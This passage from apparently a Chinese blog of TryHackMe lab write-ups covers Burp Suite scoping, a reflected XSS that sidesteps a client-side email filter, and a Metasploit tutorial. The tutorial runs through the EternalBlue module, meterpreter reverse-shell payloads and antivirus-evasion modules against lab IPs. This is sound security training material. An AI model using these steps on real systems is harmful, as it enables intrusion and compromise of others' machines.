2.简单的选择:我们可以进入项目选项-&gt;杂项-&gt;嵌入式浏览器，选中“允许嵌入式浏览器在没有沙箱的情况下运行”选项。选中此选项将允许浏览器启动，但请注意，出于安全原因，默认情况下它是禁用的:如果我们使用浏览器受到威胁，那么攻击者将可以访问我们的整台机器。在ackbox的训练环境中，这种情况不太可能发生(即使发生也不是一个大问题)，但是如果您在Burp Suite的本地安装上尝试这种情况，请记住这一点。 范围和目标 最后，我们来到使用Burp代理的最重要的部分之一:作用域。 让打嗝捕捉我们所有的流量会变得非常乏味。当它记录一切(包括我们不瞄准的网站的流量)时，它会混淆我们以后可能希望发送给客户端的日志。简而言之，让打嗝捕捉到一切可能很快就会变成巨大的痛苦。 解决办法是什么?范围。 为项目设置范围允许我们定义代理和记录的内容。我们可以限制Burp Suite只针对我们想要测试的web应用程序。最简单的方法是切换到“Target”选项卡，从左侧列表中右键单击我们的目标，然后选择“Add to Scope”。然后，Burp将询问我们是否要停止记录范围之外的任何内容——大多数情况下，我们希望在这里选择“是”。 现在我们可以通过切换到“scope”子选项卡来检查我们的作用域(如上图所示)。 范围设置窗口允许我们通过包括或排除域/ ip来控制我们的目标。这是一个非常强大的部分，所以很值得花时间去习惯使用它。 我们只是选择禁用超出范围流量的日志记录，但代理仍然会拦截所有内容。要关闭此功能，我们需要进入代理选项子选项卡，并从拦截客户端请求部分选择“URL在目标范围内”: 选择此选项后，代理将完全忽略不在作用域中的任何内容，从而极大地清理通过Burp的流量。 站点地图和问题定义 作用域的控制可能是Target选项卡最有用的方面，但这绝不是Burp本节的唯一用途。 Target下有三个子选项卡: 1.Site map允许我们在树状结构中绘制出我们所针对的应用程序。我们访问的每个页面都会显示在这里，允许我们通过浏览web应用程序自动生成目标网站地图。Burp Pro还允许我们自动抓取目标网站(即查看每个页面的链接，并使用它们绘制出尽可能多的网站-使用页面之间的链接可公开访问);然而，使用Burp Community，我们仍然可以在执行初始枚举步骤时使用它来积累数据。 如果我们想要绘制API, Site地图可能特别有用，因为每当我们访问一个页面时，页面在加载时从中检索数据的任何API端点都会显示在这里。 2.Scope Settings:我们已经看到了范围设置窗口——它允许我们控制Burp项目的目标范围。 3.Issue Definitions:虽然我们无法访问Burp社区中的Burp Suite漏洞扫描器，但我们仍然可以访问它查找的所有漏洞列表。问题定义部分为我们提供了一个巨大的web漏洞列表(完整的描述和参考)，如果我们需要引用报告或帮助描述漏洞，我们可以从中提取。 举例攻击 了解了如何设置和配置代理之后，让我们来看一个简化的真实示例。 我们将从浏览http://10.10.198.138/ticket/:上的支持表单开始 在现实世界的web应用测试中，我们会测试各种各样的东西:其中之一是跨站点脚本(或XSS)。如果您还没有遇到过XSS，可以认为它是将客户端脚本(通常是Javascript)以执行的方式注入到网页中。有各种各样的XSS——我们在这里使用的类型被称为“反射”XSS，因为它只影响发出web请求的人。 让我们开始吧。 尝试在“Contact Email”字段中输入:alert(&quot;Succ3ssful XSS&quot;)。你应该会发现有一个客户端过滤器，它可以防止你添加任何不允许在电子邮件地址中的特殊字符: 幸运的是，客户端过滤器非常容易被绕过。有很多方法可以禁用脚本，或者直接阻止它加载。 现在让我们专注于简单地绕过过滤器。 首先，确保您的burp代理是活动的，并且拦截是开启的。 现在，在支持表单中输入一些合法数据。例如:邮箱地址为“pentester@example.thm”，查询地址为“Test Attack”。 提交表单——请求应该被代理拦截。 在代理中捕获请求后，我们现在可以将email字段更改为上面非常简单的有效负载:alert(&quot;Succ3ssful XSS&quot;)。在粘贴有效负载之后，我们需要选择它，然后使用Ctrl + U快捷键对其进行URL编码，以使其能够安全发送。这个过程如下图所示: 最后，按“forward”按钮发送请求。 您应该会发现从站点收到一个警告框，表明XSS攻击成功! ","link":"https://f9f.fun/post/tryhackme-burp-suite-the-basics/"},{"title":"Tryhackme-Metasploit: Introduction","content":"Tryhackme-Metasploit: Introduction 1.Metasploit简介 Metasploit是使用最广泛的开发框架。Metasploit是一个强大的工具，可以支持渗透测试的所有阶段，从信息收集到开发后。 Metasploit有两个主要版本： Metasploit Pro：促进任务自动化和管理的商业版本。此版本具有图形用户界面 （GUI）。 Metasploit Framework：从命令行工作的开源版本。这个房间将重点介绍这个版本，安装在AttackBox上，以及最常用的渗透测试Linux发行版。 Metasploit 框架是一组工具，允许信息收集、扫描、利用、利用开发、后利用等。虽然Metasploit框架的主要用途集中在渗透测试领域，但它对于漏洞研究和漏洞利用开发也很有用。 Metasploit框架的主要组成部分可以总结如下; msfconsole：主命令行界面。 Modules：支持漏洞利用、扫描、有效负载等模块。 Tools：有助于漏洞研究、漏洞评估或渗透测试的独立工具。其中一些工具是msfvenom，pattern_create和pattern_offset。我们将在本模块中介绍msfvenom，但pattern_create和pattern_offset是有用的工具，超出了本模块的范围。 本文将介绍 Metasploit 的主要组件，同时为您提供有关如何在目标系统上查找相关漏洞、设置参数和利用易受攻击的服务的坚实基础。完成此房间后，您将能够舒适地导航和使用Metasploit命令行。 2.Metasploit的主要组成 在使用Metasploit Framework时，主要与Metasploit控制台进行交互。可以使用msfconsole命令从AttackBox终端启动控制台。控制台将成为与Metasploit Framework的不同模块进行交互的主要界面。模块是Metasploit框架中的小组件，用于执行特定任务，例如利用漏洞、扫描目标或执行暴力攻击。 在深入研究模块之前，有必要澄清一些重复出现的概念：漏洞、利用和载荷。 利用：利用目标系统上存在的漏洞的代码片段。 漏洞：影响目标系统的设计、编码或逻辑缺陷。利用漏洞可能会导致泄露机密信息或允许攻击者在目标系统上执行代码。 载荷：利用将利用漏洞。然而，如果我们希望利用产生我们想要的结果（访问目标系统、读取机密信息等），我们需要使用载荷。载荷是将在目标系统上运行的代码。 模块和每个模块下的类别如下所示。这些仅供参考，但您将通过Metasploit控制台（msfconsole）与它们进行交互。 辅助模块 Auxiliary 任何支持模块，如扫描仪、爬行器和模糊器，都可以在这里找到。 终端 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/ auxiliary/ ├── admin ├── analyze ├── bnat ├── client ├── cloud ├── crawler ├── docx ├── dos ├── example.py ├── example.rb ├── fileformat ├── fuzzers ├── gather ├── parser ├── pdf ├── scanner ├── server ├── sniffer ├── spoof ├── sqli ├── voip └── vsploit 20 directories, 2 files 编码模块 Encoders 编码器将允许您对攻击和有效载荷进行编码，希望基于签名的防病毒解决方案可能会错过它们。 基于签名的防病毒和安全解决方案具有已知威胁的数据库。它们通过将可疑文件与该数据库进行比较来检测威胁，并在有匹配项时发出警报。因此，编码器可能只有有限的成功率，因为防病毒解决方案可以执行附加检查。 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/ encoders/ ├── cmd ├── generic ├── mipsbe ├── mipsle ├── php ├── ppc ├── ruby ├── sparc ├── x64 └── x86 10 directories, 0 files 规避 Evasion 尽管编码器会对有效载荷进行编码，但不应被视为直接试图逃避防病毒软件。另一方面，“逃避”模块将尝试这样做，成功与否则不一。 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/ evasion/ └── windows ├── applocker_evasion_install_util.rb ├── applocker_evasion_msbuild.rb ├── applocker_evasion_presentationhost.rb ├── applocker_evasion_regasm_regsvcs.rb ├── applocker_evasion_workflow_compiler.rb ├── process_herpaderping.rb ├── syscall_inject.rb ├── windows_defender_exe.rb └── windows_defender_js_hta.rb 1 directory, 9 files 利用 Exploits 漏洞利用，按目标系统整齐地组织。 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/ exploits/ ├── aix ├── android ├── apple_ios ├── bsd ├── bsdi ├── dialup ├── example_linux_priv_esc.rb ├── example.py ├── example.rb ├── example_webapp.rb ├── firefox ├── freebsd ├── hpux ├── irix ├── linux ├── mainframe ├── multi ├── netware ├── openbsd ├── osx ├── qnx ├── solaris ├── unix └── windows 20 directories, 4 files 无操作 NOPs NOPs是一种空操作指令，用于在程序中不执行任何操作。 NOP（No OPeration）什么都不做，字面意思上是这样的。在英特尔x86 CPU系列中，它们用0x90表示，之后CPU将不执行任何操作一个周期。它们经常被用作缓冲来实现一致的有效载荷大小。 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/ nops/ ├── aarch64 ├── armle ├── cmd ├── mipsbe ├── php ├── ppc ├── sparc ├── tty ├── x64 └── x86 10 directories, 0 files Payloads 有效载荷是在目标系统上运行的代码。 利用将利用目标系统上的漏洞，但为了实现期望的结果，我们需要一个有效载荷。例如，获取一个shell，将恶意软件或后门加载到目标系统中，运行一个命令，或者启动calc.exe作为概念验证以添加到渗透测试报告中。通过启动calc.exe应用程序在目标系统上远程启动计算器是一种无害的方式，可以显示我们可以在目标系统上运行命令。 在目标系统上运行命令已经是一个重要的步骤，但是拥有一个允许您输入命令并在目标系统上执行的交互式连接更好。这样的交互式命令行被称为&quot;shell&quot;。Metasploit提供了发送不同有效载荷的能力，可以在目标系统上打开shell。 root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/ payloads/ ├── adapters ├── singles ├── stagers └── stages 4 directories, 0 files 在payloads目录下，你将看到四个不同的目录：adapters、singles、stagers和stages。 Adapters（适配器）：适配器将单个payload进行包装，将其转换为不同的格式。例如，一个普通的单个payload可以被包装在Powershell适配器中，这将生成一个单个的Powershell命令来执行payload。 Singles（单个）：自包含的payload（添加用户、启动notepad.exe等），不需要下载额外的组件来运行。 Stagers（分阶段）：负责在Metasploit和目标系统之间建立连接通道。在使用分阶段的payload时非常有用。“分阶段的payload”首先会在目标系统上上传一个stager，然后再下载其余的payload（stage）。这样做有一些优势，因为初始payload的大小相对较小，与一次性发送的完整payload相比。 Stages（阶段）：由stager下载。这将允许您使用更大尺寸的payload。 Metasploit有一种巧妙的方法来帮助您区分单个（也称为“内联”）payload和分阶段的payload。 generic/shell_reverse_tcp windows/x64/shell/reverse_tcp 两者都是反向Windows shell。前者是内联（或单个）payload，如“shell”和“reverse”之间的“_”所示。而后者是分阶段的payload，如“shell”和“reverse”之间的“/”所示。 POST “在上述列出的渗透测试过程的最后阶段，后期利用模块将非常有用。” root@ip-10-10-135-188:/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/ post/ ├── aix ├── android ├── apple_ios ├── bsd ├── firefox ├── hardware ├── linux ├── multi ├── networking ├── osx ├── solaris └── windows 12 directories, 0 files 如果您希望进一步熟悉这些模块，您可以在Metasploit安装的模块文件夹中找到它们。对于AttackBox而言，它们位于/opt/metasploit-framework/embedded/framework/modules目录下。 3.Msfconsole 如前所述，控制台将是Metasploit框架的主界面。您可以在您的攻击箱终端或安装了Metasploit框架的任何系统上使用msfconsole命令启动它。 msfconsole root@ip-10-10-220-191:~# msfconsole _---------. .' ####### ;.&quot; .---,. ;@ @@`; .---,.. .&quot; @@@@@'.,'@@ @@@@@',.'@@@@ &quot;. '-.@@@@@@@@@@@@@ @@@@@@@@@@@@@ @; `.@@@@@@@@@@@@ @@@@@@@@@@@@@@ .' &quot;--'.@@@ -.@ @ ,'- .'--&quot; &quot;.@' ; @ @ `. ;' |@@@@ @@@ @ . ' @@@ @@ @@ , `.@@@@ @@ . ',@@ @ ; _____________ ( 3 C ) /|___ / Metasploit! \\ ;@'. __*__,.&quot; \\|--- \\_____________/ '(.,....&quot;/ =[ metasploit v6.0 ] + -- --=[ 2048 exploits - 1105 auxiliary - 344 post ] + -- --=[ 562 payloads - 45 encoders - 10 nops ] + -- --=[ 7 evasion ] Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search msf6 &gt; 启动后，您将看到命令行更改为msf6(或msf5，具体取决于Metasploit的安装版本)。Metasploit控制台(msfconsole)可以像普通的命令行shell一样使用，如下所示。第一个命令是ls，它列出使用msfconsole命令从其中启动Metasploit的文件夹的内容。 之后是发送到Google的DNS IP地址(8.8.8.8)的ping。当我们从AttackBox操作时，它是Linux，我们必须添加-c 1选项，所以只发送一个ping。否则，ping进程将继续，直到使用CTRL+C停止为止。 Linux Commands in Metasploit msf6 &gt; ls [*] exec: ls burpsuite_community_linux_v2021_8_1.sh Instructions Scripts Desktop Pictures thinclient_drives Downloads Postman Tools msf6 &gt; ping -c 1 8.8.8.8 [*] exec: ping -c 1 8.8.8.8 PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data. 64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms --- 8.8.8.8 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 1.335/1.335/1.335/0.000 ms msf6 &gt; 它将支持大多数Linux命令，包括clear(清除终端屏幕)，但不允许您使用常规命令行的某些功能(例如，不支持输出重定向)，如下所示。 Failed Output Redirection msf6 &gt; help &gt; help.txt [-] No such command msf6 &gt; 在这个主题中，help命令可以单独使用，也可以用于特定的命令。下面是set命令的帮助菜单，我们将很快介绍。 Help feature msf6 &gt; help set Usage: set [option] [value] Set the given option to value. If value is omitted, print the current value. If both are omitted, print options that are currently set. If run from a module context, this will set the value in the module's datastore. Use -g to operate on the global datastore. If setting a PAYLOAD, this command can take an index from `show payloads'. msf6 &gt; 您可以使用history命令查看您之前键入的命令。 History command msf6 &gt; history 1 use exploit/multi/http/nostromo_code_exec 2 set lhost 10.10.16.17 3 set rport 80 4 options 5 set rhosts 10.10.29.187 6 run 7 exit 8 exit -y 9 version 10 use exploit/multi/script/web_delivery msfconsole的一个重要特性是支持选项卡完成。这将在以后使用Metasploit命令或处理模块时派上用场。例如，如果您开始键入he并按tab键，您将看到它自动完成以提供帮助。 Msfconsole是由上下文管理的;这意味着，除非设置为全局变量，否则如果您更改已决定使用的模块，所有参数设置都将丢失。在下面的示例中，我们使用了ms17_010_eternalblue漏洞，并设置了RHOSTS等参数。如果我们要切换到另一个模块(例如端口扫描仪)，我们需要再次设置RHOSTS值，因为我们所做的所有更改都保留在ms17_010_eternalblue漏洞的上下文中。 让我们看一下下面的例子，以便更好地理解这个特性。我们将使用MS17-010“永恒之蓝”漏洞进行说明。 一旦你输入use exploit/windows/smb/ms17_010_eternalblue命令，你会看到命令行提示符从msf6变为“msf6 exploit(windows/smb/ms17_010_eternalblue)”。据称，“永恒之蓝”是美国国家安全局(nsa)针对众多Windows系统上的SMBv1服务器漏洞开发的一个漏洞。SMB (Server Message Block)在Windows网络中广泛用于文件共享，甚至用于向打印机发送文件。“永恒之蓝”于2017年4月被网络犯罪组织“影子经纪人”泄露。2017年5月，该漏洞在全球范围内被WannaCry勒索软件攻击利用。 Using an exploit msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 也可以使用use命令和搜索结果行开头的数字来选择要使用的模块。 虽然提示符发生了变化，但您会注意到我们仍然可以运行前面提到的命令。这意味着我们没有像在操作系统命令行中那样“输入”一个文件夹。 Linux commands within a context msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; ls [*] exec: ls burpsuite_community_linux_v2021_8_1.sh Instructions Scripts Desktop Pictures thinclient_drives Downloads Postman Tools msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 提示告诉我们，我们现在有了一个上下文集，我们将在其中工作。您可以通过输入show options命令看到这一点。 Show options msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.220.191 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 这将打印与我们之前选择的漏洞相关的选项。show options命令将根据使用它的上下文有不同的输出。上面的例子表明，这个漏洞将要求我们设置像RHOSTS和RPORT这样的变量。另一方面，开发后模块可能只需要我们设置一个SESSION ID(见下面的截图)。会话是到目标系统的现有连接，开发后模块将使用该连接。 Options for a post-exploitation module msf6 post(windows/gather/enum_domain_users) &gt; show options Module options (post/windows/gather/enum_domain_users): Name Current Setting Required Description ---- --------------- -------- ----------- HOST no Target a specific host SESSION yes The session to run this module on. USER no Target User for NetSessionEnum msf6 post(windows/gather/enum_domain_users) &gt; show命令可以在任何上下文中使用，后面跟着模块类型(辅助、有效负载、利用等)来列出可用的模块。下面的示例列出了ms17-010 Eternalblue漏洞可以使用的有效负载。 The show payloads command msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 generic/custom manual No Custom Payload 1 generic/shell_bind_tcp manual No Generic Command Shell, Bind TCP Inline 2 generic/shell_reverse_tcp manual No Generic Command Shell, Reverse TCP Inline 3 windows/x64/exec manual No Windows x64 Execute Command 4 windows/x64/loadlibrary manual No Windows x64 LoadLibrary Path 5 windows/x64/messagebox manual No Windows MessageBox x64 6 windows/x64/meterpreter/bind_ipv6_tcp manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager 7 windows/x64/meterpreter/bind_ipv6_tcp_uuid manual No Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support 如果从msfconsole提示符中使用，show命令将列出所有模块。 到目前为止，我们看到的使用和显示选项命令对于Metasploit中的所有模块都是相同的。 您可以使用back命令离开上下文。 The back command msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; back msf6 &gt; 任何模块的进一步信息都可以通过在其上下文中输入info命令来获得。 The info command msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; info Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption Module: exploit/windows/smb/ms17_010_eternalblue Platform: Windows Arch: Privileged: Yes License: Metasploit Framework License (BSD) Rank: Average Disclosed: 2017-03-14 Provided by: Sean Dillon Dylan Davis Equation Group Shadow Brokers thelightcosine Available targets: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs Check supported: Yes Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload information: Space: 2000 Description: This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads. References: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010 https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://github.com/RiskSense-Ops/MS17-010 Also known as: ETERNALBLUE msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 或者，您可以使用info命令，后面跟着msfconsole提示符中的模块路径(例如info exploit/windows/smb/ms17_010_eternalblue)。信息不是帮助菜单;它将显示模块的详细信息，如作者、相关来源等。 Search msfconsole中最有用的命令之一是搜索。该命令将在Metasploit Framework数据库中搜索与给定搜索参数相关的模块。您可以使用CVE编号、漏洞名称(eternalblue、heartbleed等)或目标系统进行搜索。 The search command msf6 &gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 3 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce msf6 &gt; 搜索命令的输出提供了每个返回模块的概述。您可能会注意到&quot; name &quot;列已经提供了比模块名称更多的信息。您可以看到模块的类型(辅助、利用等)和模块的类别(扫描器、管理、窗口、Unix等)。您可以使用搜索结果中返回的任何模块，命令use后跟结果行开头的数字。(例如，使用0代替使用auxiliary/admin/smb/ms17_010_command) 返回的另一个重要信息在“rank”列中。漏洞是根据其可靠性进行评级的。下表提供了它们各自的描述。 Source: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking 您可以使用关键字(例如类型和平台)来指导搜索功能。 例如，如果希望搜索结果只包含辅助模块，则可以将类型设置为auxiliary。下面的屏幕截图显示了搜索类型:auxiliary telnet命令的输出。 Search by module type msf6 &gt; search type:auxiliary telnet Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/http/dlink_dir_300_600_exec_noauth 2013-02-04 normal No D-Link DIR-600 / DIR-300 Unauthenticated Remote Command Execution 1 auxiliary/admin/http/netgear_r6700_pass_reset 2020-06-15 normal Yes Netgear R6700v3 Unauthenticated LAN Admin Password Reset 2 auxiliary/dos/cisco/ios_telnet_rocem 2017-03-17 normal No Cisco IOS Telnet Denial of Service 3 auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof 2010-12-21 normal No Microsoft IIS FTP Server Encoded Response Overflow Trigger 4 auxiliary/scanner/ssh/juniper_backdoor 2015-12-20 normal No Juniper SSH Backdoor Scanner 5 auxiliary/scanner/telnet/brocade_enable_login normal No Brocade Enable Login Check Scanner 6 auxiliary/scanner/telnet/lantronix_telnet_password normal No Lantronix Telnet Password Recovery 7 auxiliary/scanner/telnet/lantronix_telnet_version normal No Lantronix Telnet Service Banner Detection 8 auxiliary/scanner/telnet/satel_cmd_exec 2017-04-07 normal No Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability 9 auxiliary/scanner/telnet/telnet_encrypt_overflow normal No Telnet Service Encryption Key ID Overflow Detection 10 auxiliary/scanner/telnet/telnet_login normal No Telnet Login Check Scanner 11 auxiliary/scanner/telnet/telnet_ruggedcom normal No RuggedCom Telnet Password Generator 12 auxiliary/scanner/telnet/telnet_version normal No Telnet Service Banner Detection 13 auxiliary/server/capture/telnet normal No Authentication Capture: Telnet Interact with a module by name or index, for example use 13 or use auxiliary/server/capture/telnet msf6 &gt; 请记住，漏洞利用了目标系统上的漏洞，并且可能总是显示出意想不到的行为。排名较低的漏洞可能会完美地工作，而排名较高的漏洞可能不会，或者更糟，使目标系统崩溃。 4.使用模块 您可以启动连接到这个房间的目标机器来复制下面所示的示例。任何Metasploit版本5或6都会有类似于这里所示的菜单和屏幕，因此您可以使用AttackBox或安装在本地计算机上的任何操作系统。 如前所述，使用use命令和模块名称进入模块上下文后，需要设置参数。下面列出了您将使用的最常见参数。请记住，根据您使用的模块，可能需要设置其他或不同的参数。最好使用show options命令列出所需的参数。 所有参数使用相同的命令语法设置: set PARAMETER_NAME VALUE 在继续之前，请记住始终检查msfconsole提示符，以确保您处于正确的上下文中。在处理Metasploit时，您可能会看到五个不同的提示: 常规命令提示符:这里不能使用Metasploit命令。 Regular command prompt root@ip-10-10-XX-XX:~# msfconsole提示符:msf6(或msf5取决于您安装的版本)是msfconsole提示符。正如您所看到的，这里没有设置上下文，因此不能在这里使用特定于上下文的命令来设置参数和运行模块。 Metasploit command prompt msf6 &gt; 上下文提示:一旦您决定使用一个模块并使用set命令来选择它，msfconsole将显示上下文。您可以在这里使用特定于上下文的命令(例如set RHOSTS 10.10.x.x)。 A context command prompt msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; Meterpreter提示符:Meterpreter是一个重要的有效负载，我们将在本模块后面详细介绍。这意味着一个Meterpreter代理被加载到目标系统并连接回您。您可以在这里使用Meterpreter特定的命令。 A Meterpreter command prompt meterpreter &gt; 目标系统上的shell:一旦利用完成，您就可以访问目标系统上的命令shell。这是一个常规命令行，在这里键入的所有命令都在目标系统上运行。 A Meterpreter command prompt C:\\Windows\\system32&gt; 如前所述，show options命令将列出所有可用的参数。 The show options command msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.44.70 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 正如您在上面的屏幕截图中所看到的，其中一些参数需要一个值才能使漏洞发挥作用。一些必需的参数值将被预先填充，请确保检查这些值是否应该与目标保持一致。例如，web漏洞可以将RPORT(远程端口:Metasploit将尝试连接并运行该漏洞的目标系统上的端口)值预设为80，但您的目标web应用程序可以使用端口8080。 在本例中，我们将使用set命令将RHOSTS参数设置为目标系统的IP地址。 A Meterpreter command prompt msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.165.39 rhosts =&gt; 10.10.165.39 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.10.165.39 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.44.70 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 设置参数后，可以使用show options命令检查设置的值是否正确。 你经常使用的参数有: RHOSTS:“远程主机”，目标系统的IP地址。可以设置单个IP地址或网络范围。这将支持CIDR(无类域间路由)符号(/24，/16等)或网络范围(10.10.10)。X - 10.10.10.y)。您还可以使用一个列出目标的文件，每行一个目标，使用file:/path/of/the/target_file.txt，如下所示。 RPORT:“远程端口”，易受攻击的应用程序运行在目标系统上的端口。 有效载荷:您将与漏洞一起使用的有效载荷。 LHOST:“Localhost”，攻击机器(您的AttackBox或Kali Linux)的IP地址。 LPORT:“本地端口”，您将用于反向shell连接回的端口。这是攻击机器上的一个端口，您可以将其设置为任何其他应用程序未使用的任何端口。 SESSION:使用Metasploit建立到目标系统的每个连接都有一个会话ID。您将在利用后模块中使用它，这些模块将使用现有连接连接到目标系统。 您可以再次使用set命令使用不同的值覆盖任何set参数。可以使用unset命令清除任意参数值，也可以使用unset all命令清除所有已设置的参数值。 The unset all command msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; unset all Flushing datastore... msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 